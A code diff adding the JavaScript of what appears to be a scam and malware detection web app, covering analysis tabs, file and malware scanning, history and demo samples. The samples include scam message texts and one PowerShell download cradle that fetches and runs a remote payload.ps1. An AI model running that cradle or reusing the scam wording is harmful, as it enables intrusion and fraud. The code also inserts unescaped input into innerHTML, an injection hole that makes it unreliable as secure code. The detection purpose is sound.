+        if (p.pattern.test(txt)) txt = txt.replace(p.pattern, function(m) {return '<span class="hl">'+m+'</span>';});
+      });
+    });
+    document.getElementById('highlighted-preview').innerHTML=txt||'[ awaiting input ]';
+
+    var fItems=reasons.filter(function(r){return r.cat==='BEC'||r.cat==='APT'||r.cat==='PHONE'||r.cat==='EMAIL'||r.cat==='URL'||r.cat==='MAL';});
+    document.getElementById('fusion-feed').innerHTML=fItems.length
+      ?fItems.map(function(r){var cc=r.cat==='PHONE'?'cp':r.cat==='EMAIL'?'cu':r.cat==='URL'?'cf':r.cat==='MAL'?'cf':r.cat==='APT'?'pz':r.cat==='BEC'?'pz':'cf';return '<div class="feed-item"><span class="fi-cat '+cc+'">'+r.cat+'</span><span class="fi-tx">'+r.reason+'</span><span class="fi-wt">+'+r.weight.toFixed(1)+'</span></div>';}).join('')
+      :'<div style="font-family:\'JetBrains Mono\';font-size:0.63rem;color:var(--text-dim);">[ no fusion signals ]</div>';
+
+    var pb=document.getElementById('phone-intel-box');
+    pb.innerHTML=(extra&&extra.phone&&extra.phone.count>0)
+      ?extra.phone.numbers.map(function(n){return '<span class="phone-tag risk">'+n+'</span>';}).join('')
+      :'<span style="font-family:\'JetBrains Mono\';font-size:0.63rem;color:var(--text-dim);">[ none detected ]</span>';
+
+    var eb=document.getElementById('email-intel-box');
+    eb.innerHTML=(extra&&extra.email&&extra.email.count>0)
+      ?extra.email.emails.filter(function(e){return e.suspicious;}).map(function(e){return '<span class="email-tag risk">'+e.email+'</span>';}).join('')
+      :'<span style="font-family:\'JetBrains Mono\';font-size:0.63rem;color:var(--text-dim);">[ none detected ]</span>';
+
+    var emailListBox=document.getElementById('email-list-box');
+    if(emailListBox)emailListBox.innerHTML=eb.innerHTML;
+
+    sessionHistory.unshift({time:new Date().toLocaleTimeString(),score:score.toFixed(1),verdict:verdict});
+    if(sessionHistory.length>15)sessionHistory.pop();
+    renderHistory();
+    
+    scanCount++;
+    document.getElementById('scan-count').textContent=scanCount;
+    document.getElementById('hdr-det').textContent=reasons.length;
+    document.getElementById('hdr-evasion').textContent=reasons.filter(function(r){return r.cat==='OBF'||r.cat==='MAL';}).length;
+  }
+
+  function renderHistory() {
+    var cont=document.getElementById('history-container');
+    document.getElementById('hist-count').textContent=sessionHistory.length+' ENTRIES';
+    if(!sessionHistory.length){cont.innerHTML='<div style="font-family:\'JetBrains Mono\';font-size:0.63rem;color:var(--text-dim);">[ no entries ]</div>';return;}
+    cont.innerHTML=sessionHistory.map(function(e){
+      var c=+e.score<4?'var(--green)':+e.score<7?'var(--gold)':+e.score<9?'#FF8C00':'var(--red)';
+      return '<div class="hist-item"><span class="hi-t">'+e.time+'</span><div class="hi-bar"><div class="hi-fill" style="width:'+((+e.score/15)*100).toFixed(0)+'%;background:'+c+';"></div></div><span class="hi-s" style="color:'+c+';">'+e.score+'</span><span class="hi-v" style="color:'+c+';">'+e.verdict+'</span></div>';
+    }).join('');
+  }
+
+  // ===== RUNNER =====
+  function runAnalysis() {
+    var active=document.querySelector('.tab-btn.active'); if(!active)return;
+    var tab=active.dataset.tab, input='';
+    
+    if(tab==='msg') input=document.getElementById('msg-input').value;
+    else if(tab==='email') {
+      var emailAddr = document.getElementById('email-input').value;
+      var emailBody = document.getElementById('email-body').value;
+      input = emailAddr + ' ' + emailBody;
+    }
+    else if(tab==='phone') input=document.getElementById('phone-input').value;
+    else if(tab==='url') input=document.getElementById('url-input').value;
+    else if(tab==='file'){var fp=document.getElementById('file-preview').innerText;input=(fp.charAt(0)==='[')?'':fp;}
+    else if(tab==='malware'){var mr=document.getElementById('malware-result').innerText;input=(mr.charAt(0)==='[')?'':mr;}
+    else if(tab==='apt') input=document.getElementById('apt-input').value;
+    else if(tab==='bec') {
+      var sender = document.getElementById('bec-sender').value;
+      var message = document.getElementById('bec-message').value;
+      input = sender + ' ' + message;
+    }
+    else return;
+    
+    var res=analyzeText(input);
+    updateUI(res.score,res.reasons,input,{phone:res.phone,email:res.email});
+    
+    if(tab==='phone'&&input){
+      var pa=analyzePhoneNumber(input);
+      var pb=document.getElementById('phone-analysis-box');
+      pb.innerHTML = pa.issues.length 
+        ? '<div style="color:var(--red);">⚠ ' + pa.issues.join('<br>⚠ ') + '</div><div style="margin-top:5px;">Country: ' + pa.country + ' | Risk: ' + pa.risk.toFixed(1) + '/8</div>'
+        : '<div style="color:var(--green);">✓ Phone appears safe</div>';
+    }
+    
+    if(tab==='url'&&input){
+      var urls = input.split('\n').filter(function(u){return u.trim();});
+      var urlBreakdown = document.getElementById('url-breakdown');
+      urlBreakdown.innerHTML = urls.map(function(url) {
+        var analysis = analyzeURL(url.trim());
+        return '<div style="margin-bottom:8px;padding:6px;background:rgba(0,0,0,0.3);"><div style="color:var(--cyan);font-size:0.68rem;word-break:break-all;">' + url.substring(0,60) + '...</div><div style="color:var(--text-dim);font-size:0.64rem;">' + (analysis.issues.length ? analysis.issues.join('; ') : '✓ Safe') + '</div></div>';
+      }).join('');
+    }
+    
+    if(tab==='apt'&&input){
+      var aptResults = document.getElementById('apt-results');
+      var aptReasons = res.reasons.filter(function(r){return r.cat==='APT';});
+      aptResults.innerHTML = aptReasons.length
+        ? aptReasons.map(function(r){return '<div class="feed-item"><span class="fi-cat pz">APT</span><span class="fi-tx">'+r.reason+'</span><span class="fi-wt">+'+r.weight.toFixed(1)+'</span></div>';}).join('')
+        : '<div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ No APT indicators detected ]</span></div>';
+    }
+    
+    if(tab==='bec'&&input){
+      var becResults = document.getElementById('bec-results');
+      var becReasons = res.reasons.filter(function(r){return r.cat==='BEC';});
+      becResults.innerHTML = becReasons.length
+        ? becReasons.map(function(r){return '<div class="feed-item"><span class="fi-cat pz">BEC</span><span class="fi-tx">'+r.reason+'</span><span class="fi-wt">+'+r.weight.toFixed(1)+'</span></div>';}).join('')
+        : '<div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ No BEC indicators detected ]</span></div>';
+    }
+  }
+
+  // ===== CLOCK =====
+  function tick(){document.getElementById('live-clock').textContent=new Date().toLocaleTimeString('en-GB');}
+  setInterval(tick,1000); tick();
+
+  // ===== DEMOS =====
+  var demos={
+    job:{text:'URGENT: Work from home ₹50k/month. No experience needed. Pay ₹1500 registration fee. Call +92 333 1234567 or email hr@jobportal-gmail.xyz',label:'Fake Job Scam'},
+    invoice:{text:'Your Geek Squad subscription renewed. Invoice $399.99. If not you, call +1-800-555-0199. Visit: http://geeksquad-cancel.xyz or email billing@geeksquad-support.tk',label:'Tech Invoice Scam'},
+    phish:{text:'http://secure.login.paypal.com-verify.ru/update?otp=required&suspended=true',label:'Phishing URL'},
+    digital:{text:'This is CBI officer. Your Aadhaar used in money laundering. You are under digital arrest. Video call now or face arrest. Email: cbi.delhi@proton.me',label:'Digital Arrest Scam'},
+    upi:{text:'Dear customer, UPI collect request of ₹4999 from SBI Bank. Approve now to receive money and avoid penalty. Call support: +91 98765 43210',label:'UPI Collect Scam'},
+    romance:{text:'Hello darling, I am widow from oil rig. Send $500 via bitcoin wallet to claim $50,000 inheritance from barrister. Email: mary.johnson@lovefinder.ru',label:'Romance Scam'},
+    sextortion:{text:'I recorded you via your webcam. Pay ₹50,000 in bitcoin or I will share the video. Act within 24h. BTC: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa',label:'Sextortion Scam'},
+    bec:{text:'FROM: ceo@company-name.com\nSubject: URGENT WIRE TRANSFER\n\nI need you to process an urgent wire transfer of $45,000 to a new vendor. This is confidential. Send me confirmation once done.\n\nCEO',label:'BEC Scam'},
+    apt:{text:'Suspicious connection to 185.142.53.123:4444. PowerShell download cradle detected: IEX (New-Object Net.WebClient).DownloadString("http://update.microsoft.ru/payload.ps1")',label:'APT C2 Activity'},
+  };
+
+  // ===== FILE HANDLING =====
+  pdfjsLib.GlobalWorkerOptions.workerSrc='https://cdnjs.cloudflare.com/ajax/libs/pdf.js/2.16.105/pdf.worker.min.js';
+  
+  function initFileHandlers() {
+    var dz=document.getElementById('file-dropzone'), fi=document.getElementById('file-input');
+    var fp=document.getElementById('file-preview'), fs=document.getElementById('file-status');
+    dz.addEventListener('click',function(){fi.click();});
+    dz.addEventListener('dragover',function(e){e.preventDefault();dz.classList.add('dragover');});
+    dz.addEventListener('dragleave',function(){dz.classList.remove('dragover');});
+    dz.addEventListener('drop',function(e){e.preventDefault();dz.classList.remove('dragover');if(e.dataTransfer.files.length)handleFile(e.dataTransfer.files[0]);});
+    fi.addEventListener('change',function(){if(fi.files.length)handleFile(fi.files[0]);});
+    
+    function handleFile(file){
+      fs.textContent='📄 '+file.name+' ('+( file.size/1024).toFixed(1)+' KB) — analyzing...';
+      fp.innerText='[ extracting content... ]';
+      var isActive=function(){var a=document.querySelector('.tab-btn.active');return a&&a.dataset.tab==='file';};
+      
+      if(file.type==='application/pdf'){
+        file.arrayBuffer().then(function(buf){return pdfjsLib.getDocument({data:buf}).promise;}).then(function(pdf){
+          var ps=[];for(var i=1;i<=pdf.numPages;i++)ps.push(pdf.getPage(i).then(function(p){return p.getTextContent();}));
+          return Promise.all(ps).then(function(cs){return{text:cs.map(function(c){return c.items.map(function(it){return it.str;}).join(' ');}).join('\n'),pages:pdf.numPages};});
+        }).then(function(r){
+          fs.textContent='✓ '+file.name+' — '+r.pages+' page(s)';
+          var ex=r.text.substring(0,4000); fp.innerText=ex.substring(0,700)+(ex.length>700?'…':'');
+          if(isActive()){var res=analyzeText(ex);updateUI(res.score,res.reasons,ex,{phone:res.phone,email:res.email});}
+        }).catch(function(e){fp.innerText='[PDF error: '+e.message+']';fs.textContent='✗ Error';});
+      } else if(file.type.startsWith('image/')){
+        var txt='[IMAGE SCAN] '+file.name; fp.innerText=txt; fs.textContent='✓ Image: '+file.name;
+        if(isActive()){var res=analyzeText(txt);updateUI(res.score,res.reasons,txt,{phone:res.phone,email:res.email});}
+      } else {
+        file.text().then(function(text){
+          fs.textContent='✓ '+file.name+' — '+text.length+' chars'; fp.innerText=text.substring(0,700)+(text.length>700?'…':'');
+          if(isActive()){var res=analyzeText(text);updateUI(res.score,res.reasons,text,{phone:res.phone,email:res.email});}
+        });
+      }
+    }
+  }
+
+  function initMalwareHandlers() {
+    var dz=document.getElementById('malware-dropzone'), fi=document.getElementById('malware-input');
+    var resBox=document.getElementById('malware-result'), statusEl=document.getElementById('malware-status');
+    var intelFeed=document.getElementById('malware-intel-feed');
+    var scanBtn=document.getElementById('scan-malware-btn');
+    var currentFile = null, currentContent = null;
+
+    function processFile(file) {
+      currentFile = file;
+      statusEl.textContent='🛡️ '+file.name+' ('+(file.size/1024).toFixed(1)+' KB) — ready for scan';
+      resBox.innerText='[ File loaded. Click "DEEP MALWARE SCAN" ]';
+      if (file.type.startsWith('text/') || file.name.match(/\.(txt|js|vbs|ps1|bat|cmd|hta|json|csv|xml)/i)) {
+        file.text().then(function(txt){ currentContent = txt; });
+      } else {
+        file.arrayBuffer().then(function(buf){
+          var bytes = new Uint8Array(buf);
+          currentContent = String.fromCharCode.apply(null, bytes);
+        });
+      }
+    }
+
+    dz.addEventListener('click',function(){fi.click();});
+    dz.addEventListener('dragover',function(e){e.preventDefault();dz.classList.add('dragover');});
+    dz.addEventListener('dragleave',function(){dz.classList.remove('dragover');});
+    dz.addEventListener('drop',function(e){e.preventDefault();dz.classList.remove('dragover');if(e.dataTransfer.files.length)processFile(e.dataTransfer.files[0]);});
+    fi.addEventListener('change',function(){if(fi.files.length)processFile(fi.files[0]);});
+
+    scanBtn.addEventListener('click', function() {
+      if (!currentFile) { alert('Please select a file first.'); return; }
+      statusEl.textContent='🔍 Scanning '+currentFile.name+' ...';
+      resBox.innerText='[ Deep malware analysis in progress... ]';
+      
+      setTimeout(function() {
+        var mal = analyzeMalwareFile(currentFile.name, currentContent || '');
+        var score = mal.risk;
+        var verdict = score<3?'LOW RISK':score<6?'SUSPICIOUS':score<8?'MALICIOUS':'CRITICAL THREAT';
+        var col = score<3?'#00FF87':score<6?'#FFB800':score<8?'#FF8C00':'#FF2D55';
+        var resultHtml = '<div style="margin-bottom:8px;"><span style="color:'+col+';font-weight:bold;">'+verdict+'</span> (Score: '+score.toFixed(1)+'/10)</div>';
+        
+        if (mal.issues.length) {
+          resultHtml += mal.issues.map(function(i){return '<div style="padding:2px 0;"><span style="color:var(--red);">⚠</span> '+i+'</div>';}).join('');
+        } else {
+          resultHtml += '<div style="color:var(--green);">✓ No malware indicators found.</div>';
+        }
+        resBox.innerHTML = resultHtml;
+        intelFeed.innerHTML = mal.issues.length ? mal.issues.map(function(i){return '<div class="feed-item"><span class="fi-cat cf">MAL</span><span class="fi-tx">'+i+'</span></div>';}).join('') : '<div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ No malware signals ]</span></div>';
+        
+        if (document.querySelector('.tab-btn.active').dataset.tab === 'malware') {
+          var reasons = mal.issues.map(function(i){return {reason: i, weight: score/mal.issues.length, cat: 'MAL'};});
+          updateUI(score, reasons, 'Malware scan: '+currentFile.name, {phone:{count:0,numbers:[]}, email:{count:0,emails:[]}});
+        }
+        statusEl.textContent='✅ Scan complete: '+currentFile.name;
+      }, 800);
+    });
+  }
+
+  // ===== INIT =====
+  function initApp() {
+    var dl=document.getElementById('demo-list');
+    dl.innerHTML=Object.entries(demos).map(function(e){return '<div class="demo-card" data-demo="'+e[0]+'"><div class="dc-type">'+e[1].label+'</div><div class="dc-pre">'+e[1].text.substring(0,72)+'…</div></div>';}).join('');
+    
+    document.querySelectorAll('[data-demo]').forEach(function(el){
+      el.addEventListener('click',function(){
+        var demo=demos[el.dataset.demo];
+        document.getElementById('msg-input').value=demo.text;
+        document.querySelector('[data-tab="msg"]').click();
+        runAnalysis();
+      });
+    });
+
+    drawMeter(0);
+    updateUI(0, [], '', {phone:{count:0,numbers:[]}, email:{count:0,emails:[]}});
+
+    document.querySelectorAll('.tab-btn').forEach(function(b){
+      b.addEventListener('click',function(){
+        document.querySelectorAll('.tab-btn').forEach(function(bt){bt.classList.remove('active');});
+        this.classList.add('active');
+        document.querySelectorAll('.tab-content').forEach(function(c){c.style.display='none';});
+        var el=document.getElementById('tab-'+this.dataset.tab);
+        if(el)el.style.display='block';
+        var tab=this.dataset.tab;
+        if(tab!=='edu'&&tab!=='demo'&&tab!=='malware'&&tab!=='apt'&&tab!=='bec')runAnalysis();
+      });
+    });
+
+    document.getElementById('analyze-btn').addEventListener('click',runAnalysis);
+    document.getElementById('clear-btn').addEventListener('click',function(){
+      document.querySelectorAll('textarea,input[type=text]').forEach(function(i){i.value='';});
+      document.getElementById('file-preview').innerText='[ awaiting file ]';
+      document.getElementById('file-status').textContent='';
+      document.getElementById('url-breakdown').innerHTML='';
+      document.getElementById('phone-analysis-box').innerHTML='[ Enter a phone number to analyze ]';
+      document.getElementById('email-list-box').innerHTML='';
+      document.getElementById('msg-cc').textContent='0 chars';
+      document.getElementById('malware-result').innerHTML='[ awaiting malware sample ]';
+      document.getElementById('malware-status').textContent='';
+      document.getElementById('malware-intel-feed').innerHTML='<div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ No active threats ]</span></div>';
+      document.getElementById('apt-results').innerHTML='<div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ awaiting analysis ]</span></div>';
+      document.getElementById('bec-results').innerHTML='<div class="feed-item"><span class="fi-tx" style="color:var(--text-dim);">[ awaiting analysis ]</span></div>';
+      updateUI(0,[],'',{phone:{count:0,numbers:[]},email:{count:0,emails:[]}});
+    });
+    
+    document.getElementById('clear-history').addEventListener('click',function(){sessionHistory.length=0;renderHistory();});
+    
+    document.getElementById('quick-url-scan').addEventListener('click',function(){
+      var url=document.getElementById('url-input').value; if(!url)return;
+      runAnalysis();
+    });
+    
+    document.getElementById('apt-scan-btn').addEventListener('click',runAnalysis);
+    document.getElementById('bec-scan-btn').addEventListener('click',runAnalysis);
+    
+    document.getElementById('msg-input').addEventListener('input',function(){
+      document.getElementById('msg-cc').textContent=this.value.length+' chars';
+      if(document.querySelector('.tab-btn.active').dataset.tab==='msg')runAnalysis();
+    });
+
+    initFileHandlers();
+    initMalwareHandlers();
+  }
+
+})();
+</script>
+</body>
+</html>
